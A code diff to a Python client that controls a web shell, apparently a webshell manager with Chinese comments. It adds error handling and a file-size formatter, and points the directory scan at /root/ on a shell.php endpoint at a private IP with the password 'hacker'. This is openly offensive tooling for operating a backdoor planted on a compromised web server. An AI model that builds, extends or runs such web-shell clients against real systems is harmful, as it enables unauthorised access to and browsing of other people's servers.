@@ -64,13 +64,27 @@ def scanDir(url, password, dir):
     if r.status_code != 200:
         raise Exception('status_code == '+str(r.status_code))
     # 是否正确对payload进行响应
+    if  rt[8:].startswith('ERROR://'):
+        raise Exception(rt[8:-8])
+
     if rt.startswith(ra) and rt.endswith(rb):
         return rt[8:-8]
     else:
         raise Exception('PassWord Error!')
 
+
+def formatFileSize(bytes, precision):
+    for unit in ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB']:
+        if abs(bytes) < 1024.0:
+            return '%s %s' % (format(bytes, '.%df' % precision), unit)
+        bytes /= 1024.0
+    return '%s %s' % (format(bytes, '.%df' % precision), 'Yi')
+
+
+
 if __name__ == '__main__':
     url = 'http://192.168.20.131/shell.php'
     password = 'hacker'
     print(TestConn(url, password))
-    print(scanDir(url, password, '/var/www/html/'))
+    print(scanDir(url, password, '/root/'))
+    print(formatFileSize(102401, 2))
